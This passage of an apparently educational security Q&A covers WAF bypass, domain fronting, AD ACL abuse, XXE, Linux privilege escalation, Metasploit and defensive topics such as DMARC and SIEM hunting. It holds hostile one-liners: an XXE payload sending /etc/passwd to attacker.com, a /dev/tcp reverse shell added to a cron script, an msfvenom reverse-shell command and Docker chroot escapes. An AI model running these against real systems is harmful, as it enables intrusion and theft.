FROM; comment injection: SQL: SE/**/LECT (MySQL inline comment splits keyword); /*!50000 UNION*/ (MySQL version-specific comment executes); SQLite: no comments; alternative syntax: SQL OR: || in ANSI SQL; MSSQL: EXEC xp_cmdshell vs EXEC(xp_cmdshell); MySQL CONCAT vs CONCAT_WS; function alternatives: CHAR(65) = A; CHF(32+33) = A; chunked transfer encoding: send payload in chunked HTTP body; some WAFs parse fully assembled body but might miss chunked; HTTP parameter pollution: supply same parameter twice: ?id=1&id=2 UNION SELECT; WAF inspects first instance; backend processes second; HTTP method override: POST with X-HTTP-Method-Override: GET; WAF inspects POST; backend treats as GET. WAF specific bypasses: Cloudflare WAF bypass: test with: fuzzing for working payloads; known bypass lists; wafninja (WAF bypass tool); ModSecurity CRS bypass: paranoia level 1 (default) has known bypasses; paranoia level 3/4 much harder; SSRF bypass: attacker.com@internal-host (most WAF check @-split); http://127.1 instead of 127.0.0.1; http://0 (0.0.0.0 equivalent on some systems); decimal IP: http://2130706433 (127.0.0.1 in decimal). Testing: manual: Burp Suite Intruder with encoding; automated: sqlmap with tamper scripts (--tamper=space2comment, charencode, randomcase); wafw00f (WAF fingerprinting); ghauri (SQLi WAF bypass tool); nikto with evasion options; GraphQL: different syntax may bypass WAF; Prevention (defender side): WAF in blocking mode with high paranoia; layer with RASP (runtime, context-aware); application-level input validation (not just WAF); WAF is not last line of defence; defence in depth.
What is domain fronting in C2 infrastructure?

Domain fronting: route C2 traffic through CDN infrastructure of major provider; CDN forwards to attacker server; block requires blocking entire CDN. How domain fronting works: CDN (Cloudflare, AWS CloudFront, Azure CDN): large CDN; hosts many domains; traffic to CDN from network looks like: HTTPS to legitimate-sounding domain; TLS SNI (Server Name Indication): domain in TLS handshake (visible to network monitoring even in HTTPS); HTTP Host header: actual destination inside encrypted HTTPS; CDN routes based on Host header not SNI; domain fronting: TLS SNI: legitimate domain (allowed.example.com) on CDN; HTTP Host header (inside encrypted TLS): attacker C2 backend (c2.attacker.com, also on same CDN); CDN sees SNI: allowed.example.com (allowed by firewall); CDN routes based on Host: c2.attacker.com; forwards to attacker infrastructure; network observer: sees connection to allowed.example.com over port 443; does not see Host header (inside TLS). Why effective: firewall allows legitimate CDN (cloudfront.net, cloudflare.com, azureedge.net); blocking CDN would break legitimate business; no malware signature in traffic (legitimate HTTPS to CDN); encrypted content. Current status: major CDN providers cracked down: AWS CloudFront (2018): disabled domain fronting; Google Cloud CDN: disabled; Cloudflare: limited (enterprise plans); Azure: blocked standard domain fronting; detection: CDN provider enforcement: CDN validates SNI matches Host; rejects mismatched requests; still possible on some smaller CDN providers or misconfigured CDN setups; alternatives: domain fronting-like techniques using CDN worker or function: Cloudflare Workers can proxy; harder to detect but requires CDN account; residential proxy networks; bulletproof hosting with legitimate-looking domains; categorised domains. Detection: network monitoring: if CDN validates SNI matches Host: effectively blocked; TLS fingerprint (JA3): detect C2 client by TLS fingerprint regardless of routing; DNS: CDN resolution points; if CDN validates: no fronting possible; for defenders: CDN inspection (SSL inspection with proper certificate validation) would catch: SNI vs Host mismatch; most enterprise SSL inspection does this; network sandboxes check C2 behaviour even over HTTPS.
What is active directory privilege escalation via ACL abuse?

Active Directory ACL abuse: exploit misconfigured access control lists on AD objects; grant self elevated permissions; escalate to domain admin. AD ACLs: every AD object has DACL (Discretionary Access Control List); defines who has what permissions on the object; permissions include: GenericAll, GenericWrite, WriteDACL, WriteOwner, AddMember, ForceChangePassword, AllExtendedRights; misconfigured ACL: regular user has powerful permission on sensitive AD object; abuse for privilege escalation. Specific permissions exploitable: GenericAll on user: attacker can: reset password, modify group membership, disable account, add to any group; GenericAll on group: add any user to group; add self to Domain Admins; WriteDACL: write new ACE to DACL; grant self GenericAll; then exploit GenericAll; WriteOwner: change object owner; become owner; owner has implicit full control; ForceChangePassword: reset target user password without knowing current password; over-the-wire reset; AddMember on group: add self or any user to group; direct group membership; User-Force-Change-Password extended right: same as ForceChangePassword; GenericWrite: write specific attributes; most interesting: scriptPath (logon script) = code execution on user next logon, servicePrincipalName = add SPN; make Kerberoastable. Enumeration: BloodHound + SharpHound: collect AD data; BloodHound UI: find shortest path to Domain Admins; highlight ACL-based attack paths; PowerView: Get-DomainObjectAcl -DistinguishedName DC=corp,DC=com -ResolveGUIDs; identify non-default permissions; filter for interesting principals (not Administrators, Domain Admins): Get-DomainObjectAcl | Where-Object {$_.SecurityIdentifier -match REGULAR_USER_SID}. Exploitation: PowerView: Set-DomainObjectOwner (WriteOwner abuse); Add-DomainObjectAcl (add ACE); Set-DomainUserPassword (ForceChangePassword); Add-DomainGroupMember (AddMember); Impacket: dacledit.py (Python-based ACL modification); owneredit.py; scenario: regular user has GenericAll on Service Account with SPN; add self-controlled SPN; Kerberoast service account; crack password; service account has local admin on servers; lateral movement. Prevention: quarterly ACL auditing: review all non-default ACLs on privileged objects; BloodHound: run internally; find and remove unexpected ACEs; AdminSDHolder: protects high-privileged group members; propagated every 60 minutes; remove unexpected ACEs from AdminSDHolder; Protected Users group: additional protections; monitoring: Event 5136 (directory service object modified); alert on: ACL changes on sensitive objects (Domain Admins group, AdminSDHolder, user accounts), especially when source is non-admin account.
What is industrial control system (ICS) security incident response?

ICS incident response: respond to cyberattacks on operational technology; safety is paramount; different from IT IR. Why ICS IR differs: safety first: incorrect response can cause physical harm (explosion, release of hazardous material, injury); production impact: every ICS response action has business and safety consequence; specialized knowledge: OT protocols (Modbus, DNP3, Profibus), engineer expertise required; limited patching: cannot patch or restart ICS systems without plant engineer approval and planned outage; legacy systems: no EDR, no modern logging, no encryption; air-gap assumption: many ICS teams assume air-gap protects them; not always true. ICS IR phases: detect: OT-specific detection: passive network monitoring (Nozomi, Claroty, Dragos), historian anomalies, operator observations (HMI displaying wrong values, PLC behaving unexpectedly), safety system alarms, IT-side indicators suggesting lateral movement toward OT network; contain: decision: continue production with accepted risk vs emergency shutdown vs controlled shutdown; never automatically isolate OT systems (may cause worse physical consequence); consult plant engineer; safety engineer; operations manager; emergency procedures: if immediate safety risk: activate emergency shutdown procedures (process-specific); in-band vs out-of-band: use out-of-band network for IR comms (not the compromised OT network); eradicate: after safe shutdown: remove malware; restore clean configurations from backup; verify hardware integrity; recover: restore from known-good backups; verify PLC ladder logic integrity (compare to last known good); staged startup: bring systems up sequentially; verify each stage before proceeding; test safety systems before resuming production. Preparation: ICS IR plan: separate from IT IR plan; specific playbooks for scenarios (ransomware on historian, PLC manipulation, HMI compromise); OT-specific IR tools: USB-based forensic tools (cannot install agents on PLCs); Portable network capture hardware (tap); reference configurations: offline backup of all PLC programs, HMI configurations, historian schemas; exercises: OT-specific tabletop; scenario: adversary modifies PLC setpoints; notification tree: who to call in OT incident (plant manager, safety manager, equipment vendor, ICS-CERT, FBI); safety system isolation: know how to isolate control system safety functions from digital control while maintaining physical safety. Standards: ICS-CERT (CISA): incident reporting and support; IEC 62443-2-1: security management system for IACS; NIST SP 800-82: ICS security guide including IR guidance; ISA-99: security programme elements; Dragos Year in Review: ICS threat landscape and IR case studies.
What is XML external entity (XXE) injection?

XXE (XML External Entity) injection: exploit XML parser external entity processing; read local files, SSRF, RCE in some cases. XML entities: XML supports entity definitions: <!ENTITY name value>; referenced as &name; in XML; external entity: entity value loaded from external resource: <!ENTITY xxe SYSTEM file:///etc/passwd>; &xxe; in XML body: parser fetches /etc/passwd; contents inserted into XML. Attack types: file read: <?xml version=1.0?><!DOCTYPE foo [<!ENTITY xxe SYSTEM file:///etc/passwd>]><root>&xxe;</root>; if parser processes external entities and response includes entity content: /etc/passwd returned to attacker; SSRF: <!ENTITY xxe SYSTEM http://169.254.169.254/latest/meta-data/> (cloud metadata); internal network scanning: <!ENTITY xxe SYSTEM http://internal-server:8080/>; detect open ports by response differences; error-based: blind XXE; trigger error with file content in error message; OOB (Out-of-Band) XXE: exfiltrate data via DNS or HTTP callback: <!ENTITY % file SYSTEM file:///etc/passwd><!ENTITY % eval <!ENTITY % exfil SYSTEM http://attacker.com/?x=%file;>>%eval;%exfil; chain parameter entities; file content sent to attacker server. Prerequisites: application accepts and parses XML; XML parser processes external entities (disabled in many modern parsers by default); response includes parsed entity content (or OOB channel available). Finding XXE: any functionality that accepts XML input: API with XML body, file upload (SVG, DOCX, XLSX -- these are XML), web services (SOAP), RSS/Atom feeds; JSON to XML conversion: some parsers accept both; send XML where JSON expected; SVG upload: SVG is XML; <!DOCTYPE> in uploaded SVG; DOCX/XLSX: ZIP archive containing XML files; inject XXE in word/document.xml inside DOCX. Prevention: disable external entity processing: Java SAX: factory.setFeature(http://apache.org/xml/features/disallow-doctype-decl, true); Java DOM: DocumentBuilderFactory.setExpandEntityReferences(false); Python lxml: etree.XMLParser(resolve_entities=False); PHP: libxml_disable_entity_loader(true) (PHP 7.4-; PHP 8.0+ disabled by default);.NET: XmlReaderSettings.DtdProcessing = DtdProcessing.Prohibit; allowlist: if external entities required: strict allowlist of permitted URLs; input validation: reject DOCTYPE declarations if not needed; OWASP XXE Prevention Cheat Sheet: specific configuration per language and XML library.
What is credential stuffing and how do you defend against it?

Credential stuffing: automated testing of stolen username/password combinations against target application; exploits password reuse. How it works: data breach: billions of credentials from breaches available (Collection #1 -- 87GB, RockYou2021 -- 8.4B, Have I Been Pwned database); credential combos: username:password pairs from breaches; attackers test these against target: script or tool sends automated login attempts; valid credentials: if user reused same password on breach site and target: successful authentication without brute force; scale: millions of attempts per day; distributed across many IPs to avoid rate limiting; success rate: 0.1-2% success rate with large combo list = thousands of compromised accounts. Why credential stuffing works: password reuse: 65% of users reuse passwords across sites; same email and password on Netflix and bank; breach databases: massive, comprehensive, and updated continuously; automation: Sentry MBA, SNIPR, OpenBullet, BlackBullet: configurable attack tools; residential proxies: rotate through millions of IPs; defeat IP-based rate limiting. Detection: login failure rate spike: large-scale stuffing generates many failures; alert on 4xx error rate increase on login endpoint; distributed attack: many source IPs; each IP makes few attempts; harder to detect than single-IP brute force; but: residential proxy IPs have low reputation; correlation across IPs (same user agent, same timing pattern, same behaviour). Defence: CAPTCHA on login: Google reCAPTCHA v3 (invisible); challenge suspicious sessions; friction for automation; credential breach checking: HaveIBeenPwned API integration: on login or password change: check if credential in known breach; prompt password change; NIST 800-63B requirement; anomaly detection: impossible travel: login from New York then London within 1 hour; new device / browser fingerprint: challenge with step-up auth; MFA: even if credential correct: second factor required; most stuffing tools cannot handle MFA; blocks majority of stuffing attacks; rate limiting per account: X login failures on account A: lock account; alert; notify user; regardless of source IP; password manager promotion: encourage unique passwords per site via awareness training; device fingerprinting: consistent fingerprint for legitimate users; unknown fingerprint: challenge; Arkose Labs, DataDome, Imperva: bot management with ML behaviour analysis; monitoring: dark web monitoring (Digital Shadows, Recorded Future): alert if organisation credentials appear in breach dumps; proactive: test own credentials against breach databases.
What is security testing of thick client applications?

Thick client security testing: assess desktop applications; different attack surface from web apps; often overlooked. Types: two-tier: client communicates directly to database; client contains database credentials; one-tier: completely local; no network; three-tier: client communicates with server; server communicates with database; more secure architecture. Attack surface: local storage: application stores data locally; check: configuration files, registry, log files, temp files, SQLite databases, Windows Credential Manager, memory; traffic: application communicates with server; intercept and analyse; local processing: application logic runs locally; reverse engineer; bypass validation; input fields: search, forms, file paths. Tools: Burp Suite: intercept thick client HTTP/HTTPS traffic; configure system proxy; many clients use WinHTTP or WinINet (can be proxied); Wireshark: non-HTTP protocols; raw packet capture; Process Monitor (ProcMon): file system and registry access; Process Hacker: inspect process memory, network connections, loaded DLLs; strings (Sysinternals): extract strings from binary; x64dbg/Ghidra: reverse engineering; Frida: dynamic instrumentation; hook functions, modify behaviour; Android emulator: if mobile thick client; Jadx: decompile APK. Technique areas: traffic interception: configure application to use proxy; if application has certificate pinning: bypass pinning (Frida, custom root CA); analyse: protocols used, authentication mechanism, session management, encrypted vs cleartext; if proprietary protocol: Wireshark dissector or Frida for decoding; local storage: search installation directory: strings on executables (embedded credentials, URLs, encryption keys); check registry: HKCU\Software\AppName; check config files (XML, JSON, INI, DB); check temp files (%TEMP%, %APPDATA%); process memory: attach debugger; search for credentials in memory; Procdump and strings on dump; binary analysis: decompile (.NET: dnSpy/ILSpy; Java: Jadx/JD-GUI; native: Ghidra); find: hardcoded credentials, weak encryption, insecure API calls, bypass conditions; authentication: can username/password be bypassed? Can session token be forged? Is there a remember me vulnerability?; client-side validation: validate all validation server-side too (client validation can be bypassed). Common findings: hardcoded credentials: application contains admin password for backend database; DLL hijacking: application loads DLL from user-writable path; man-in-the-middle: no certificate validation; weak encryption: custom XOR encryption for local data; SQL injection: application builds SQL queries with user input (even in local SQLite).
What is mobile application penetration testing?

Mobile application penetration testing: assess iOS and Android apps; client-side security, data storage, network communication, server-side API. Android pentest setup: physical device or emulator (AVD or Genymotion); ADB (Android Debug Bridge): adb devices, adb shell; root or emulator without play protect; static analysis: APK extraction: adb pull, APK from device; decompile: Jadx-GUI or apktool (smali); MobSF (Mobile Security Framework): automated static + dynamic analysis; examine: AndroidManifest.xml (permissions, components, exported activities, debug mode, backup allowed), network_security_config.xml (SSL pinning, cleartext traffic); dynamic analysis: configure Burp proxy on host; set proxy on device (manual or ADB); install Burp CA certificate on device; Android 7.0+: user CAs not trusted by default; bypass: network_security_config.xml modification or Frida SSL bypass; Frida: dynamic instrumentation; hook methods; bypass root detection, certificate pinning, anti-debugging; Drozer: Android security assessment framework; test exposed components; Objection: Frida-based; easy SSL pinning bypass; root detection bypass. iOS pentest setup: jailbroken iPhone or Frida on non-jailbroken (unc0ver, checkra1n); IPA extraction: from App Store (usually DRM-protected); resign-and-install; Frida via SSH; static analysis: Ghidra or Hopper: Mach-O binary analysis; class-dump or frida-objc-bridge: dump Objective-C class headers; Bagbak: IPA decryption from jailbroken device; MobSF: static analysis; Info.plist: permissions, transport security settings; dynamic analysis: Objection: jailbreak detection bypass, SSL pinning bypass; ProxyChains or Burp for traffic interception; Frida scripts for custom hooks. Testing areas: data storage: insecure: SharedPreferences, NSUserDefaults (sensitive data); SQLite database (plaintext credentials, PII); external storage (SD card world-readable); keychain/Keystore misuse; temp files; network: SSL pinning bypass (test after bypass: MITMing traffic); certificate validation; cleartext traffic; sensitive data in network logs; authentication: token storage, session management, MFA bypass; client-side controls: bypass (root detection, jailbreak detection, emulator detection); reverse engineer business logic; IPC (Inter-Process Communication): Android intents: exported activities, deep links, content providers (accessible without authentication?); iOS URL schemes, XPC; server-side API: treat as web app API test; same OWASP API Top 10 applies; OWASP Mobile Security Testing Guide (MSTG): comprehensive mobile security checklist.
What is advanced SIEM query techniques for threat hunting?

Advanced SIEM queries: beyond alert-based detection; proactive hunting for hidden threats using analytics. Threat hunting with SIEM: hypothesis-based: attacker uses Kerberoasting (T1558.003); hunt: large number of Kerberos TGS requests from single host; TGS with RC4 encryption (weaker, preferred for Kerberoasting); data-driven: review anomalies in data; unusual times, unusual volumes, new patterns. Splunk SPL (Search Processing Language) examples: parent-child process anomaly: index=windows EventCode=4688 | stats count by ParentProcessName, NewProcessName | where count < 5 | sort count (rare parent-child process combinations; potential LOLBin abuse); credential spraying detection: index=windows EventCode=4625 | stats count dc(TargetUserName) as unique_users by IpAddress | where unique_users > 20 AND count > 50 | sort -count (many unique usernames from same IP = spraying); Kerberoasting hunt: index=windows EventCode=4769 TicketEncryptionType=0x17 | stats count by ServiceName, ClientAddress | where count > 5; lateral movement via SMB: index=windows EventCode=5145 ShareName=\\*\ADMIN$ | stats count by IpAddress, SubjectUserName | where count > 3; PowerShell encoded commands: index=windows EventCode=4688 NewProcessName=*powershell.exe CommandLine=*-enc* | table _time, ComputerName, SubjectUserName, CommandLine; beaconing detection: index=proxy | stats count, avg(bytes_out) as avg_bytes, stdev(response_time) as stdev_time by dest_host | where count > 100 AND stdev_time < 5 (very consistent response time = beacon). Elastic KQL/EQL examples: EQL sequence: sequence by process.entity_id [process where process.name == cmd.exe] [network where network.direction == egress] (command then network = potential C2); EQL: process where process.parent.name == winword.exe and process.name in (cmd.exe, powershell.exe, wscript.exe) (Office spawning shell = macro execution). Statistical techniques: baseline + standard deviation: calculate mean and stdev for metric over 30 days; alert when current value > mean + 3*stdev (3 sigma); rare events: count events over time; alert on values in lowest 1st percentile; new entities: first seen analysis; alert on: first time user logs in from new country, first time process creates network connection, first time new service installed. Data enrichment: enrich IPs with threat intel (VirusTotal, MISP) within SIEM; user context (HR data: is this a terminated employee?); asset context (is this a server or workstation?); geolocation; network segment.
What is post-compromise Linux privilege escalation?

Linux privilege escalation: escalate from limited shell to root after initial access; enumerate weak configurations. Enumeration: automated: linPEAS (linux-smart-enumeration): comprehensive; detects many privilege escalation vectors; run:./linpeas.sh; LinEnum: similar; manual: id, whoami, uname -a (kernel version), cat /etc/os-release, env, history, sudo -l (what can user run as root?), cat /etc/passwd (usernames), ls -la /etc/shadow (world-readable?), find / -perm -4000 2>/dev/null (SUID binaries), crontab -l, cat /etc/crontab, find / -writable 2>/dev/null (writable files), ps aux (running processes), netstat -tlnp (listening services). Privilege escalation techniques: sudo misconfigurations: sudo -l shows: user ALL=(ALL) NOPASSWD: /usr/bin/vim; vim can be used to spawn root shell: sudo vim -c !sh; GTFOBins (gtfobins.github.io): catalogue of Unix binaries that can bypass restrictions; every sudo-allowed binary has GTFOBin entry if exploitable; SUID binaries: binary with SUID bit: runs as file owner (often root); find / -perm /4000 2>/dev/null; check each against GTFOBins: cp (SUID): copy /etc/passwd (writable); add root user; bash (SUID): bash -p (root shell); Cron jobs: writable script in crontab; echo /bin/bash -i >& /dev/tcp/attacker/4444 0>&1 >> /path/to/cron/script.sh; wait for cron execution; writable cron directory: drop script in /etc/cron.d/ or /etc/cron.daily/; PATH hijacking in cron: crontab runs script without full path; attacker-controlled directory in PATH before system directory; drop malicious version of called binary; NFS (Network File System): cat /etc/exports: no_root_squash means root on NFS client = root on server; mount NFS share from attacker machine; create SUID binary: cp /bin/bash.; chmod +s./bash; execute on target:./bash -p (root shell); kernel exploits: uname -r for kernel version; searchsploit kernel version; DirtyCow (CVE-2016-5195): works on many older kernels; careful: may crash system; Docker/container: running in Docker? cat /.dockerenv or mount output; Docker group membership: docker run -v /:/mnt --rm -it alpine chroot /mnt sh (root filesystem mounted inside container); writable Docker socket: docker run --rm -v /:/mnt busybox chroot /mnt sh; weak file permissions: /etc/passwd writable: add root user (hash from openssl passwd); /etc/sudoers writable: add user ALL=(ALL) NOPASSWD: ALL; world-writable /etc/cron.d/; LD_PRELOAD: sudo allowed with LD_PRELOAD preserved: create malicious shared library; sudo LD_PRELOAD=/tmp/evil.so binary; library runs as root before binary.
What is network traffic analysis for anomaly detection?

Network traffic anomaly detection: identify deviations from baseline network behaviour; detect attacks, C2, and data exfiltration without signatures. Baseline establishment: collect 2-4 weeks normal traffic; define normal: per host, per subnet, per application; metrics: bytes per hour, connections per hour, unique destinations, protocols used, DNS queries per hour, top talkers; seasonal patterns: business hours vs off-hours; weekly patterns; Statistical methods: mean + standard deviation: alert if metric exceeds mean + N*stdev; threshold: 3 sigma = 0.27% false positive rate; entropy: Shannon entropy for: DNS query character distribution (DGA detection = high entropy), HTTP User-Agent diversity, request destination diversity; percentile-based: alert if current value outside 1st-99th percentile of historical; time-series analysis: detect trends, seasonality, sudden changes; STL decomposition (Seasonal-Trend-Loess). Specific detection use cases: C2 beaconing: attacker implant checks in periodically; detect: periodic traffic to same destination, consistent packet sizes, regular intervals (Cobalt Strike default 60s); Fast Fourier Transform (FFT) on connection timing: detect periodic signal; tools: RITA (Real Intelligence Threat Analytics): open-source; beaconing and DNS tunneling detection from Zeek logs; beacon score per destination; DGA (Domain Generation Algorithm) detection: malware generates random domain names to find C2; detect: high-entropy domain names, many NXDomain (non-existent) responses in short time, new domains without history; ML: train classifier on domain name strings; lexical analysis (vowel ratio, n-gram frequency); tools: MLsec DGA classifier, Zeek DGA detection package; DNS tunneling: encode data in DNS queries; detect: unusually high query rate to single domain, unusually long query names, unusual query types (TXT, NULL), large DNS responses; Zeek dns.log: dns_query_type, query_len, answer_ttl. ML approaches: unsupervised: k-means clustering: cluster traffic; outliers are anomalies; autoencoders: train on normal traffic; high reconstruction error = anomaly; isolation forest: random forest detecting outliers; supervised: requires labeled attack data; more accurate but needs training data; network graph analysis: build graph of source-destination connections; nodes with unusual centrality or sudden change in degree = anomaly; tools: Zeek + Elastic stack; RITA; NetworkX for graph analysis; Suricata anomaly detection rules; Enterprise: Darktrace (unsupervised ML); ExtraHop Reveal(x) (ML-based network detection); Vectra AI (network threat detection); Corelight (Zeek enterprise + cloud integration).
What is OAuth 2.0 PKCE flow and why is it important?

PKCE (Proof Key for Code Exchange): extension to OAuth 2.0 authorization code flow; prevents authorization code interception attack; required for public clients. Why PKCE: public clients: mobile apps, SPAs (Single Page Apps), CLI tools; cannot securely store client_secret (decompiled, extracted); without PKCE: authorization code in redirect URL can be intercepted; malicious app on same device catches redirect; uses authorization code to get access token; PKCE prevents by binding code to original request. How PKCE works: client generates code_verifier: random 43-128 character string; code_challenge = BASE64URL(SHA256(code_verifier)); authorization request: include code_challenge and code_challenge_method=S256 in authorization URL; authorization server stores code_challenge; user authenticates; authorization code returned to client; token request: client includes code_verifier in token request; authorization server: SHA256(code_verifier) must equal stored code_challenge; if intercepted authorization code: attacker does not have code_verifier; cannot exchange code for token; code_challenge (hash) useless without original verifier. Implementation: authorization URL: https://auth.example.com/authorize?response_type=code&client_id=app&redirect_uri=app://callback&scope=openid&code_challenge=HASH&code_challenge_method=S256&state=random; token request POST: grant_type=authorization_code&code=AUTH_CODE&redirect_uri=app://callback&code_verifier=ORIGINAL_VERIFIER; client libraries: AppAuth (iOS, Android): implements PKCE automatically; MSAL (Microsoft): PKCE built-in; Auth0, Okta SDKs: PKCE supported; server requirements: authorization server must support PKCE; most modern OAuth servers do; PKCE required for: mobile apps (RFC 8252: OAuth for Native Apps), SPAs (RFC 9700: best practices); backend web apps: still use client_secret + PKCE for defence in depth; both mechanisms; PKCE should not replace client_secret for confidential clients; use both; state parameter: still required even with PKCE; prevents CSRF; different from code interception; bind state to session; validate state in callback. Security requirements: code_verifier: minimum 43 characters of cryptographic random; use crypto.getRandomValues (browser) or os.urandom (Python); S256 method mandatory (plain method provides no protection; never use plain in production).
What is DMARC and email security?

DMARC (Domain-based Message Authentication, Reporting and Conformance): email authentication policy; prevent domain spoofing; build on SPF and DKIM. Email authentication stack: SPF (Sender Policy Framework): DNS TXT record listing authorised sending IPs; example: v=spf1 include:_spf.google.com ip4:203.0.113.0/24 ~all; receiving server: check if sending IP is in SPF record; softfail (~all) or fail (-all); DKIM (DomainKeys Identified Mail): cryptographic signature added by sending MTA; DNS TXT record contains public key (selector._domainkey.example.com); receiving server verifies signature against DNS public key; ensures email not modified in transit; signature covers: specific headers and body hash; DMARC: policy stating what to do if SPF or DKIM fails; alignment: SPF domain must align with From header domain; DKIM signing domain must align with From header; policy options: p=none (monitor; do not reject), p=quarantine (send to spam), p=reject (reject email); reporting: rua (aggregate reports; daily; summary), ruf (forensic reports; per-failure; PII concerns). DMARC record example: v=DMARC1; p=reject; sp=reject; adkim=s; aspf=s; rua=mailto:dmarc@example.com; ruf=mailto:dmarc-forensic@example.com; pct=100; aspf=s (strict alignment: From domain must exactly match SPF domain); aspf=r (relaxed: subdomain OK); adkim: DKIM alignment; pct: percentage of email DMARC policy applied to (start with 25%, increase to 100%). DMARC deployment approach: start with p=none: collect reports; understand legitimate email flows; fix SPF and DKIM for all legitimate senders; move to p=quarantine (pct=25); gradually increase pct; move to p=reject pct=100 when confident; do not skip to reject immediately: may break legitimate email. Email authentication tools: DMARC report analysis: Dmarcian, Valimail, URIports, Postmark (free), MXToolbox; email authentication check: mail-tester.com, Google Admin Toolbox; MTA-STS: SMTP MTA Strict Transport Security; enforce TLS for email delivery; prevent downgrade; BIMI (Brand Indicators for Message Identification): requires p=quarantine or p=reject DMARC; display brand logo in email client; marketing benefit for security investment. Subdomain spoofing: subdomain of example.com can be spoofed if only example.com has DMARC; sp= in DMARC covers subdomains; set sp=reject to cover all subdomains; alternative: publish DMARC for each subdomain; wildcard DMARC: _dmarc.*.example.com not supported; use sp= on parent. Vendor email (third party sending email on behalf of domain): configure SPF to include vendor IP ranges; configure DKIM signing with vendor (vendor adds your DKIM key to their MTA); or use subdomain for vendor (vendor@marketing.example.com; separate DKIM key and SPF for marketing.example.com); preferred: separate subdomain per vendor; limit blast radius if vendor compromised.
What is cloud security posture management (CSPM)?

CSPM (Cloud Security Posture Management): continuously assess and remediate cloud infrastructure misconfigurations; enforce security policies across cloud accounts. Why CSPM: cloud infrastructure grows rapidly; manual configuration review impossible at scale; misconfigurations common cause of cloud breaches (S3 bucket exposed, security group open to world); CSPM: automated continuous scanning; detect misconfigurations; alert or auto-remediate; coverage: multi-cloud (AWS, Azure, GCP, OCI); infrastructure services (compute, storage, networking, IAM, database). CSPM capabilities: asset discovery: automatically discover all cloud resources across accounts and regions; shadow IT: find resources not in CMDB; configuration assessment: compare resource configuration to: CIS Benchmarks (AWS, Azure, GCP), regulatory standards (PCI DSS, HIPAA, SOC 2, GDPR), custom security policies; example checks: S3 bucket public access enabled, S3 versioning disabled, EC2 instance with public IP in production VPC, security group with 0.0.0.0/0 on SSH (port 22), IAM user with no MFA, RDS instance publicly accessible, EBS volume not encrypted, CloudTrail not enabled, root account used recently; remediation: alert: send finding to SIEM or ticketing; auto-remediate: Terraform or cloud API to fix configuration automatically (example: enable S3 versioning automatically); risk prioritisation: not all misconfigurations equally important; CSPM contextualises: is this S3 bucket actually internet-accessible and does it contain sensitive data?; network path analysis: is this security group open to internet AND attached to critical instance?; attack path analysis: identify sequences of misconfigurations enabling attack path from internet to sensitive data. Products: Prisma Cloud (Palo Alto Networks): most comprehensive; multi-cloud; CSPM + CWPP + CIEM; Wiz: highly rated; agentless; deep context; attack path analysis; Lacework: ML-based anomaly detection + CSPM; Orca Security: agentless; side-scanning; cloud-native; AWS Security Hub: AWS-only; aggregates findings from Config, GuardDuty, Inspector, Macie, IAM Access Analyzer; GCP Security Command Center: GCP-native; Azure Defender for Cloud (Security Center): Azure-native; Prowler: open-source multi-cloud; ScoutSuite: open-source multi-cloud; CloudMapper: AWS visualisation + security. Integration: CSPM findings to SIEM: alert routing; CSPM to ITSM: Jira/ServiceNow tickets per finding; CSPM to SOAR: auto-remediation playbooks; developer integration: infrastructure as code scan (pre-CSPM): Checkov checks Terraform before deployment; CSPM catches what slips through. CIEM (Cloud Infrastructure Entitlement Management): sibling to CSPM; focuses on IAM permissions; identify: overpermissive roles, unused permissions, cross-account risks; CSPM + CIEM together = comprehensive cloud security posture.
What is the Metasploit Framework?

Metasploit Framework: most widely used exploitation framework; open-source; Ruby-based; penetration testing and exploit development. Architecture: msfconsole: main command interface; Workspace: organise engagements; database backend (PostgreSQL); modules: exploits (vulnerability exploitation), payloads (code to run after exploitation), auxiliary (scanning, brute force, enumeration), post (post-exploitation), encoders (payload encoding), nops (NOP sleds for buffer overflow), evasion (AV evasion). Basic workflow: msfconsole; db_nmap -sV TARGET (Nmap scan saving to DB); search type:exploit platform:windows CVE-2017-0144 (search for EternalBlue); use exploit/windows/smb/ms17_010_eternalblue; show options; set RHOSTS 192.168.1.100; set LHOST 192.168.1.1; run (or exploit); post-exploitation: sessions -l (list sessions); sessions -i 1 (interact with session); load kiwi (Mimikatz integration); getsystem (privilege escalation); hashdump (dump NTLM hashes); Meterpreter: advanced post-exploitation agent; features: upload/download, run commands (shell), pivot (route through compromised host), port forwarding, capture keystrokes/screenshots, migrate process, persistence (run_as_service). Common modules: Scanners: auxiliary/scanner/smb/smb_ms17_010 (check EternalBlue vulnerability); auxiliary/scanner/portscan/tcp; Exploits: ms17_010_eternalblue (Windows SMB), MS08_067 (older Windows SMB), EternalRomance, BlueKeep (RDP CVE-2019-0708), ProxyShell (Exchange); Payloads: windows/x64/meterpreter/reverse_tcp (stageless: all in one), windows/x64/meterpreter_reverse_tcp (staged: small stager + download); msfvenom: payload generator; msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f exe > shell.exe; Evasion: encoders (shikata_ga_nai: polynomial encoder; signature detected by most AV); better: custom shellcode, C wrapper, in-memory execution; AV evasion: msfvenom --encrypt aes256; Metasploit Pro (commercial): automated exploitation, phishing campaigns, advanced reporting. Detection: Metasploit has recognisable signatures: JA3 TLS fingerprint for Meterpreter; default SSL certificate serial number; network behaviour; EDR: detect process injection; LSASS access; PowerShell encoded commands; Meterpreter memory signatures; YARA rules for Meterpreter; in modern environments: Metasploit payloads often detected; commercial C2 (Cobalt Strike, Havoc) used for stealth.
What is a cybersecurity reading list for professionals?

Cybersecurity reading list: authoritative books, resources, and continuous learning sources.
